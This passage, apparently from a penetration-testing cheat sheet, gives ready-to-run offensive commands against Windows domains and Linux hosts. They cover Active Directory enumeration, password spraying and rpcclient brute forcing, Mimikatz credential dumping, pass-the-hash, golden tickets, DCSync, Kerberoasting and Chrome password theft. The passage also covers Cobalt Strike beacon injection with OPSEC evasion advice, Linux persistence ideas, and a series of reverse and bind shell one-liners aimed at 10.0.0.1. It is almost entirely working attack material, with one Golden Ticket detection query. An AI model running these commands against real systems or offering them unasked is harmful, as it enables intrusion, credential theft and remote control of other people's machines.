[ - GroupName \u201c Enterprise Admins \u201d ] [ - UserName \"svcAccount\" ] Get domain user info 1 2 3 Get - NetUser [ -UserName john ] Get - NetUser - Domain < domain > | Select - Object objectsid , lockouttime , samaccounttype , accountexpires , objectclass , useraccountcontrol , @{ Name = 'memberof' ; Expression = { [ string ]:: join ( \";\" ,( $ _ . memberof )) }} , info , distinguishedname , adspath , cn , pwdlastset , objectguid , whencreated , description , samaccountname , usnchanged , name | export - csv userprops_members . csv Find group names 1 Get - NetGroup [ - GroupName * admin * ] Get group members 1 Get - NetGroupMember [ - GroupName \u201c Domain Admins \u201d ] Find open shares - Noisy 1 Invoke - ShareFinder - CheckShareAccess Find open (non-default i.e. C$) shares by LDAP source 1 2 3 Invoke - ShareFinder - ComputerADSPath \"LDAP://OU=Servers,OU=IT,DC=domain,DC=com\" - CheckShareAccess - ExcludeStandard | Out - File - Encoding ascii c : \\ windows \\ temp \\ server_shares . txt Invoke - ShareFinder - ExcludePrint - ExcludeIPC - CheckShareAccess Find interesting files 1 powershell Invoke - FileFinder - ComputerName < hostname > - share share_list . txt - terms ssn , pass , sensitive , secret , admin , login , unattend * . xml , web . config , account - Threads 20 | export - csv filefinder_shares . csv Find hosts where the current user is local admin - Noisy 1 Find - LocalAdminAccess Get details of all domain computers and export to a CSV file for easy viewing 1 Get - computerproperty - Domain < domain . com > - properties displayname , adspath , lastlogontimestamp , operatingsystem , operatingsystemversion , @{ Name = 'memberof' ; Expression = { [ string ]:: join ( \";\" ,( $ _ . memberof )) }} | export - csv computerprops . csv Get Computers with Unconstrained Delegation 1 Get - NetComputer - Unconstrained | ft - a Get Users & Computers Trusted for Delegation 1 2 3 Get - DomainUser - TrustedtoAuth - Properties distinguisedname , useraccountcontrol , msds - allowedtodelegateto | fl Get - DomainComputer - TrustedtoAuth - Properties distinguisedname , useraccountcontrol , msds - allowedtodelegateto | fl net * Functions: \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Get - NetDomain - gets the name of the current user ' s domain Get - NetForest - gets the forest associated with the current user ' s domain Get - NetForestDomain - gets all domains for the current forest Get - NetDomainController - gets the domain controllers for the current computer ' s domain Get - NetUser - returns all user objects , or the user specified ( wildcard specifiable ) Add - NetUser - adds a local or domain user Get - NetComputer - gets a list of all current servers in the domain Get - NetPrinter - gets an array of all current computers objects in a domain Get - NetOU - gets data for domain organization units Get - NetSite - gets current sites in a domain Get - NetSubnet - gets registered subnets for a domain Get - NetGroup - gets a list of all current groups in a domain Get - NetGroupMember - gets a list of all current users in a specified domain group Get - NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add - NetGroupUser - adds a local or domain user to a local or domain group Get - NetFileServer - get a list of file servers used by current domain users Get - DFSshare - gets a list of all distribute file system shares on a domain Get - NetShare - gets share information for a specified server Get - NetLoggedon - gets users actively logged onto a specified server Get - NetSession - gets active sessions on a specified server Get - NetRDPSession - gets active RDP sessions for a specified server ( like qwinsta ) Get - NetProcess - gets the remote processes and owners on a remote server Get - UserEvent - returns logon or TGT events from the event log for a specified host Get - ADObject - takes a domain SID and returns the user , group , or computer object associated with it Set - ADObject - takes a SID , name , or SamAccountName to query for a specified domain object , and then sets a specified ' PropertyName ' to a specified ' PropertyValue ' GPO functions \u00b6 1 2 3 4 5 6 7 8 9 Get - GptTmpl - parses a GptTmpl . inf to a custom object Get - NetGPO - gets all current GPOs for a given domain Get - NetGPOGroup - gets all GPOs in a domain that set \" Restricted Groups \" on on target machines Find - GPOLocation - takes a user / group and makes machines they have effective rights over through GPO enumeration and correlation Find - GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get - DomainPolicy - returns the default domain or DC policy User-Hunting Functions: \u00b6 1 2 3 4 Invoke - UserHunter - finds machines on the local domain where specified users are logged into , and can optionally check if the current user has local admin access to found machines Invoke - StealthUserHunter - finds all file servers utilizes in user HomeDirectories , and checks the sessions one each file server , hunting for particular users Invoke - ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke - UserEventHunter - hunts for user logon events in domain controller event logs Domain Trust Functions: \u00b6 1 2 3 4 5 Get - NetDomainTrust - gets all trusts for the current user ' s domain Get - NetForestTrust - gets all trusts for the forest associated with the current user ' s domain Find - ForeignUser - enumerates users who are in groups outside of their principal domain Find - ForeignGroup - enumerates all the members of a domain ' s groups and finds users that are outside of the queried domain Invoke - MapDomainTrust - try to build a relational mapping of all domain trusts MetaFunctions: \u00b6 1 2 3 4 5 6 7 Invoke - ShareFinder - finds ( non - standard ) shares on hosts in the local domain Invoke - FileFinder - finds potentially sensitive files on hosts in the local domain Find - LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find - UserField - searches a user field for a particular term Find - ComputerField - searches a computer field for a particular term Get - ExploitableSystem - finds systems likely vulnerable to common exploits Invoke - EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain HarmJ0y PowerView Cheat Sheet PDF HarmJ0y's PowerView 2.0 Tricks Gist Inveigh \u00b6 https://github.com/Kevin-Robertson/Inveigh Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. The main Inveigh LLMNR/NBNS spoofer function. 1 Privilege Requirements: \u00b6 Elevated Administrator or SYSTEM Features: \u00b6 IPv4 LLMNR/NBNS spoofer with granular control NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB Basic auth cleartext credential capture over HTTP/HTTPS WPAD server capable of hosting a basic or custom wpad.dat file HTTP/HTTPS server capable of hosting limited content Granular control of console and file output Run time control Powershell W/out Powershell \u00b6 MsBuild.exe https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml Get-IndexedItem \u00b6 Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents Sources: https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1 Interacting w/ Windows API \u00b6 https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/ Example - Lock Workstation and MessageBox \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Add - Type - TypeDefinition @\" using System ; using System . Diagnostics ; using System . Runtime . InteropServices ; public static class User32 { [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool MessageBox ( IntPtr hWnd , /// Parent window handle String text , /// Text message to display String caption , /// Window caption int options ); /// MessageBox type [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool LockWorkStation (); } \"@ [ USER32 ] :: LockWorkStation () List static methods 1 [ USER32 ] | get - member - static MailSniper (OWA and Exchange Enumeration) \u00b6 Source: https://github.com/dafthack/MailSniper MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain. MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS. Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?p=5396 It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange. Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\\EWS\\Exchange.asmx Invoke - SelfSearch - Mailbox email @domain . com - ExchHostname mail . domain . com - Remote After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user\u2019s inbox for key terms (by default \u201c pass \u201d, \u201c creds \u201d, and \u201c credentials \u201d). Locate OWA instances via Autodiscover using only organization primary domain name \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 < smtp-mail-domain >/ Autodiscover / Autodiscover . xml or autodiscover .< smtp-mail-domain >/ Autodiscover / Autodiscover . xml or dig _autodiscover . _tcp .< domain-name > SRV ; <<>> DiG 9 . 8 . 3-P1 <<>> _autodiscover . _tcp .< domain-name > . org SRV ;; global options : + cmd ;; Got answer : ;; - >> HEADER << - opcode : QUERY , status : NOERROR , id : 45003 ;; flags : qr rd ra ; QUERY : 1 , ANSWER : 1 , AUTHORITY : 0 , ADDITIONAL : 0 ;; QUESTION SECTION : ; _autodiscover . _tcp .< domain-name > . org . IN SRV ;; ANSWER SECTION : _autodiscover . _tcp .< domain-name > . org . 1720 IN SRV 0 0 443 webmail .< domain-name > . org . ;; Query time : 2 msec ;; SERVER : 192 . 168 . 178 . 1 # 53 ( 192 . 168 . 178 . 1 ) ;; WHEN : Thu Dec 1 10 : 40 : 33 2016 ;; MSG SIZE rcvd : 83 DomainPasswordSpray (Internal Windows Domain Password Brute Forcing) \u00b6 Source: https://github.com/dafthack/DomainPasswordSpray DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! Quick Start Guide \u00b6 Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'. 1 Type 'Import-Module Invoke-DomainPasswordSpray.ps1' . The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts. The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016. 1 PowerShell Invoke - DomainPasswordSpray - Password Winter2016 The following command will use the userlist at users.txt and try to authenticate to the domain \"domain-name\" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt 1 PowerShell Invoke - DomainPasswordSpray - UserList users . txt - Domain domain - name - PasswordList passlist . txt - OutFile sprayed - creds . txt Invoke-DomainPasswordSpray Options \u00b6 1 2 3 4 5 UserList - Optional UserList parameter . This will be generated automatically if not specified . Password - A single password that will be used to perform the password spray . PasswordList - A list of passwords one per line to use for the password spray ( Be very careful not to lockout accounts ) . OutFile - A file to output the results to . Domain - A domain to spray against . Misc Powershell Pasties \u00b6 List Removeable Drives 1 Get - WmiObject Win32_LogicalDisk | Where - Object { ( $ _ . DriveType - eq 2 ) - and ( $ _ . DeviceID - ne 'A:' ) } | % { \"USB_PROCESS_DETECTED: \" + $ _ . ProviderName + \"`n\" } Random Execution Method 1 2 3 $ visio = [ activator ]:: CreateInstance ( [ type ]:: GetTypeFromProgID ( \" visio.application \" , \" system1 \" )) $d ocs = $ visio . Documents . Add ( \"\" ) $d ocs . ExecuteLine ( ' CreateObject(\"Wscript.Shell\").Exec(\"cmd.exe\") ' ) Mimikatz \u00b6 https://github.com/gentilkiwi/mimikatz/wiki https://adsecurity.org/?p=2362 Dump Cleartext Credentials 1 2 3 sekurlsa :: wdigest sekurlsa :: logonpasswords lsadump :: secrets Dump cached domain credentials 1 lsadump :: cache Format mscachev2 as $ DCC2$10240 # username # hash 1 cat 'mscachecreds.txt' | awk - F \u201c : \u201d { 'print \"$DCC2$10240#\"$1\"#\"$2' } Crack mscachev2 format with Hashcat (extremely slow) 1 . / hashcat - m 2100 - a 0 mscachev2 . dump . / wordlists /* -r rules/dive.rule DCSYNC - Remote Hash Dumping from a Domain Controller 1 mimikatz lsadump :: dcsync / user : domain \\ krbtgt There is also a CS built-in function for this Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/ Pass the Hash 1 mimikatz sekurlsa :: pth / user : localadmin / domain :. / ntlm : 21306681 c738c3ed2d615e29be1574a3 / run : powershell - w hidden Golden Ticket Creation (File) 1 mimikatz kerberos :: golden / user : newadmin / domain : domain . com / sid : S - 1 - 5 - 21 - 3683589091 - 3492174527 - 1688384936 / groups : 501 , 502 , 513 , 512 , 520 , 518 , 519 / krbtgt : < krbtgthash > / ticket : newadmin . tkt Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session 1 mimikatz kerberos :: golden / user : newadmin / domain : domain . com / sid : S - 1 - 5 - 21 - 3683589091 - 3492174527 - 1688384936 / krbtgt : < krbtgthash > / ptt To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces: 1 2 3 4 5 6 7 8 / user : ChildDomainControllerMachineName$ \u2002\u2002 / rc4 : KRBTGT Hash / sid : Child Domain SID / domain : FQDN of Child Domain / groups : 516 / sids : ParentSID - 516 , S - 1 - 5 - 9 / id : ID of Child Domain Controller / ptt Dump Google Chrome passwords 1 2 3 4 5 shell copy \"C:\\users\\kobrien\\appdata\\local\\google\\chrome\\user data\\default\\Login Data\" C : \\ users \\ public \\ libraries \\ ld . dat steal_token < user pid > mimikatz @dpapi :: chrome / in : C : \\ users \\ public \\ libraries \\ ld . dat / unprotect Detecting Golden Ticket use on a DC 1 2 3 4 5 6 7 8 9 10 11 12 13 <QueryList> \u2002\u2002 <Query Id= \"0\" Path= \"Security\" > \u2002\u2002\u2002\u2002 <Select Path= \"Security\" > \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[System[EventID='4768']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='ServiceName'] = 'krbtgt']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='TicketEncryptionType'] = '0x17']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002 </Select> \u2002\u2002 </Query> </QueryList> Kerberoast \u00b6 https://github.com/nidem/kerberoast https://room362.com/post/2016/kerberoast-pt1/ https://room362.com/post/2016/kerberoast-pt2/ https://room362.com/post/2016/kerberoast-pt3/ 1 Add - Type - AssemblyName System . IdentityModel ; New - Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken - ArgumentList \"MSSQLSvc/host.domain.com\" Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used) 1 2 mimkatz kerberos :: list / export Invoke - Mimikatz - Command ' standard::base64 \"kerberos::list /export\" exit ' Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred) 1 proxychains python . / GetUserSPNs . py - request domain . com / domainuser : password - dc - ip < domain controller IP > - outputfile < out . dump > Cracking the hashes 1 2 3 . / hashcat - m 13100 - a 0 spns . dump . / wordlists /* -r rules/dive.rule ./john --format=krb5tgs spns.dump --wordlist= Domain Admin Privesc Methods \u00b6 https://adsecurity.org/?p=2362 Passwords in SYSVOL & Group Policy Preferences 1 findstr / S cpassword % logonserver % \\ sysvol \\ * . xml or use Get-GPPPasswords.ps1 from PowerSploit Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch Kerberos TGS Service Ticket Offline Cracking (Kerberoast) The Credential Theft Shuffle Gain access to AD Database file (ntds.dit) Backup locations (backup server storage, media, and/or network shares) Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers. With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline. Command and Control \u00b6 Simple TCP Port Redirection 1 2 socat TCP - LISTEN : 80 , fork TCP : < remote host > : 80 socat TCP - LISTEN : 443 , fork TCP : < remote host > : 443 UDP Port Redirection 1 socat udp4-recvfrom : 53 , reuseaddr , fork udp4-sendto :< IPADDRESS >; echo -ne Simple HTTP Redirect Save as a file like the following as redirect.html and map to root \"/\" on your Team Server. Casual browsing to the root of your domain will then simply redirect. 1 2 3 4 <html> <title> Google </title> <meta http-equiv= \"refresh\" content= \"0;url=https://www.googlrrrr.com\" /> </html> Domain Fronting \u00b6 https://github.com/rvrsh3ll/FindFrontableDomains Cobalt Strike \u00b6 http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/ https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna https://github.com/Und3rf10w/Aggressor-scripts 1 portscan 10 . 42 . 175 . 0 / 26 21 , 22 , 23 , 25 , 80 , 443 , 445 , 1433 , 3389 , 8080 , 8443 Start Remote Beacon DLL via iwmi 1 powerpick iwmi - class Win32_Process - name create - ArgumentList \"rundll32.exe c:\\users\\public\\libraries\\smb_beacon.dll.log0,StartW\" OPSEC Considerations for Beacon Commands \u00b6 Blog.Cobaltstrike.com - OPSEC Considerations For Beacon Commands A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe. API-only These commands are built-into Beacon and rely on Win32 APIs to meet their objectives. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cd cp download drives exit getuid kerberos_ccache_use kerberos_ticket_purge kerberos_ticket_use jobkill kill link ls make_token mkdir mv ppid ps pwd rev2self rm rportfwd socks steal_token timestomp unlink upload House-keeping Commands The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cancel checkin clear downloads help jobs mode dns mode dns - txt mode dns6 mode http note powershell - import sleep socks stop spawnto Post-Exploitation Jobs (Process Execution + Remote Process Injection) Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 browserpivot bypassuac covertvpn dcsync desktop elevate hashdump keylogger logonpasswords mimikatz net portscan powerpick psinject pth screenshot shspawn spawn ssh ssh - key wdigest OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don\u2019t want that). The ppid command will change the parent process these jobs are run under as well. Process Execution These commands spawn a new process: 1 2 3 execute runas runu OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu. Process Execution: Cmd.exe The shell command depends on cmd.exe. The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe. OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script\u2019s &bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand. Process Execution: PowerShell.exe The following commands launch powershell.exe to perform some task on your behalf. 1 2 3 4 5 powershell spawnas spawnu winrm wmi OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe: 1 2 3 spawnu has runu which runs an arbitrary command under another process . spawnas has runas which runs an arbitrary command as another user . powershell has powerpick , this command runs powershell scripts without powershell . exe . It\u2019s also possible to laterally spread without the winrm and wmi commands. Remote Process Injection The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are: 1 2 3 dllinject inject shinject Service Creation The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services. 1 2 3 getsystem psexec psexec_psh Powershell Function Wrapper \u00b6 https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/ Persistence Scripts \u00b6 https://github.com/ZonkSec/persistence-aggressor-script https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna EMPIRE \u00b6 Cheat sheets 1 2 - https : // github . com / adaptivethreat / Empire / wiki / Quickstart - https : // attackerkb . com / Powershell / Powershell_Empire Clone GIT Repo 1 2 root @workstation : ~ # git clone https : // github . com / adaptivethreat / Empire . git empire Cloning into 'empire' ... Install Empire 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root @ workstation : ~ # cd empire / root @ workstation : ~/ empire # cd setup / root @ workstation : ~/ empire / setup # . / install . sh Reading package lists ... Done Building dependency tree Reading state information ... Done ... Successfully installed pydispatcher Cleaning up ... [ > ] Enter server negotiation password , enter for random generation : [ * ] Database setup completed ! root @ workstation : ~/ empire / setup # Start Empire 1 2 root @workstation : ~/ empire / setup # cd .. root @workstation : ~/ empire # . / empire Start with REST API for use with Empire Web 1 2 3 . / empire --headless --username admin --password <PASSWORD> --restport 1337 . / empire --rest --username admin --password <PASSWORD> --restport 1337 C2 Profiles \u00b6 Edit default client settings in / setup / setup_database . py Example Default Profile 1 \"/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en\" Linux \u00b6 BASH \u00b6 BASH loop example 1 2 3 4 for u in ` cat hosts . txt ` ; do echo - n \" [*] user: $u \" && \\ proxychains python / usr / local / bin / secretsdump . py domain / username @$ u - hashes aad3b435b51404eeaad3b435b51404ee : 0 e493911f561a425e7a905329f4454bf | tee user_brute . log done BASH .bashrc Function Example 1 2 3 function start_sshtunnel () { ssh - A - t - p22 - L 8800 : localhost : 8800 james @123.001.123 - t ssh - L 8800 : localhost : 80 james @124.125.123 } Quick BASH format .bash_profile (mod ipconfig > ifconfig for Linux) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # . bash_profile PATH = $ PATH : / home / james / export PATH alias ls = ' ls -G ' alias grep = ' grep --color=auto ' alias la = ' ls -AlahG ' alias el = ' sudo $(history -p \\!\\!) ' alias ll = ' ls -alF ' alias l = ' ls -CF ' alias lg = ' ls -AlahG |grep $1 ' alias netstati = ' lsof -P -i -n ' export PS1 = \" \\n\\n \\[\\$(if [[ \\$? == 0 ]]; then echo \\ \" \\[$ GREEN \\]\u2713\\ \" ; else echo \\ \" \\[$ RED \\]\u2715\\ \" ; fi)[\\033[33m\\]\\D{%Y%m%d_%H%M%S}\\[\\033[m\\] \\[\\033[36m\\]\\u@\\h__`ipconfig getifaddr en0`__`ipconfig getifaddr en8`\\[\\033[m\\]] \\[\\033[1;31m\\] \\n [\\w]\\[\\033[m\\] \\n \\$ Create NTLM Hash from Mac CLI 1 echo - n password | iconv - t UTF - 16 LE | openssl md4 Linux Persistence Ideas \u00b6 1 2 3 4 Cron Add SSH keys Add SUID to world - writeable script ( chmod u + s < file > ) Add init script ( reboot persistence ) rpcclient \u00b6 http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions 1 2 3 4 5 6 rpcclient - U \"\" - N < WinIPaddr > rpcclient - U < username > < WinIPaddr > rpcclient $ > srvinfo rpcclient $ > enum rpcclient $ > enumdomusers rpcclient $ > queryuser 500 Password bruteforce via rpcclient 1 2 3 4 for u in ` cat users_sorted . txt ` ; do echo - n \" [*] user: $u \" && \\ proxychains rpcclient - U \" domain\\$u%$u \" - c \" getusername;quit \" 10 . 9 . 8 . 40 done Pass the Hash Variant 1 pth - rpcclient - U \"domain\\name%hash\" --pw-nt-hash 10.4.128.41 enum4linux \u00b6 Domain Controller Anonymous Enumeration 1 enum4linux - A <ip> | tee <ip> - anon-enum . txt iptables \u00b6 Append rules to top of the Input filter and make persistent 1 2 3 4 / sbin / iptables - I INPUT - p tcp --dport 50050 -s <ip address> -j ACCEPT / sbin / iptables - I INPUT - p tcp --dport 22 -s <ip address> -j ACCEPT service netfilter - persistent save iptables - L - v Delete rule 1 iptables - D INPUT - i eth0 - p tcp --dport 443 -j ACCEPT ldapsearch \u00b6 Obtain LAPS passwords for domain computers using the linux based ldapsearch tool Dump Laps Passwords with LDAPSearch by Rob Fuller 1 2 3 4 5 6 7 8 ldapsearch - x - h 192 . 168 . 80 . 10 - D \" helpdesk \" - w ASDqwe123 - b \" dc=sittingduck,dc=info \" \" (ms-MCS-AdmPwd=*) \" ms - MCS - AdmPwd - x - Use basic authentication - h 192 . 168 . 80 . 10 - Connect to the Domain Controller for ldap - D \" helpdesk \" - w ASDqwe123 - Login as the helpdesk user , with the password ASDqwe123 - b \" dc=sittingduck,dc=info \" - This loads the base LDAP object of the entire domain . \" (ms-MCS-AdmPwd=*) \" - Filter out any objects that I can \u2019 t see a value for ms - MCS - AdmPwd for . ( If you have rights as that user to see even one Administrator password , this will show it . ) ms - MCS - AdmPwd - Only show me the ms - MCS - AdmPwd object ( which by default includes the object name and DN so you will still know what host it belongs to ) NFS \u00b6 List NFS Mounts on remote host 1 showmount - e < ipaddr > Check NFS share counts in a loop 1 2 3 4 5 6 7 8 # cat nfs . results . msf | grep -| cut - d ' - ' - f2 | cut - d ' ' - f2 , 5 | sed ' s/ /:/g ' for server in $ ( cat nfs . shares ) ; do echo \" [*] Checking $server \" mount - o nolock , nfsvers = 3 $ server / mnt / n4s_backup ls / mnt / n4s_backup umount / mnt / n4s_backup done Shells \u00b6 TTY Shells \u00b6 http://pentestmonkey.net/blog/post-exploitation-without-a-tty Upgrade your shell to a full TTY 1 2 3 4 5 6 7 8 9 10 11 12 13 python - c 'import pty; pty.spawn(\"/bin/sh\")' echo os . system ( '/bin/bash' ) / bin / sh - i perl \u2014 e 'exec \"/bin/sh\";' perl : exec \"/bin/sh\" ; ruby : exec \"/bin/sh\" lua : os . execute ( '/bin/sh' ) (From within IRB) 1 exec \" /bin/sh \" (From within vi) 1 : ! bash (From within vi) 1 : set shell =/ bin / bash : shell (From within nmap) 1 ! sh Bind Shells \u00b6 https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py Perl Bind Shell (Port 1000) 1 perl - e ' use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/usr/bin/bash -i\");}; ' Reverse Shells \u00b6 Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10): 1 bash - i >& / dev / tcp / 10 . 0 . 0 . 1 / 8080 0 >& 1 PERL Here\u2019s a shorter, feature-free version of the perl-reverse-shell: 1 perl - e ' use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}; ' Python This was tested under Linux / Python 2.7: 1 python - c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' PHP This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn\u2019t work, try 4, 5, 6\u2026 1 php - r ' $sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ' Ruby 1 ruby - rsocket - e ' f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f) ' Netcat Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don\u2019t support the -e option. 1 nc - e / bin / sh 10 . 0 . 0 . 1 1234 If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this: 1 rm / tmp / f ; mkfifo / tmp / f ; cat / tmp / f |/ bin / sh - i 2 >& 1 | nc 10 . 0 . 0 . 1 1234 >/ tmp / f Java 1 2 3 r = Runtime . getRuntime () p = r . exec ( [ \" /bin/bash \" , \" -c \" , \" exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done \" ] as String [] ) p . waitFor () xterm One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. 1 xterm - display 10 . 0 . 0 . 1 : 1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): 1 Xnest : 1 your\u2019ll need to authorise the target to connect to you (command also run on your host): 1 xhost + targetip SSH Tunnels \u00b6 Send data over ssh to port 9000 on target 1 ssh - L 8090 : localhost : 9000 james @123.123.123 Send data over ssh to port 80 on target through jumphost 1 ssh - A - t - p22 - L 8800 : localhost : 8800 james @123.001.123.321 - t ssh - L 8800 : localhost : 80 james @124.123.122 Start ssh using existing connections 1 2 3 nano ~/ . ssh / config ControlMaster auto ControlPath ~/ . ssh / control : % h : % p : % r Impacket \u00b6 Source: https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15 Install impacket on Windows \u00b6 1 git clone https : // github . com / CoreSecurity / impacket . git Download VC++ For Python 2.7 (Needed to compile some modules) https://www.microsoft.com/en-us/download/details.aspx?id=44266 Install necessary modules (You may need to install pip first) 1 python - m pip install pycrypto pyasn1 pyOpenSSL pyReadline ldapdomaindump You can also download the PyCrypto binary if it fails to compile http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe Secretsdump \u00b6 Attempt to dump credentials from a remote machine via Pass the Hash 1 python secretsdump . py . / localadmin @computername . domain . com - hashes aad3b435b51404eeaad3b435b51404ee : 21306681 c738c3ed2d615e29be1574a3 Dump domain password 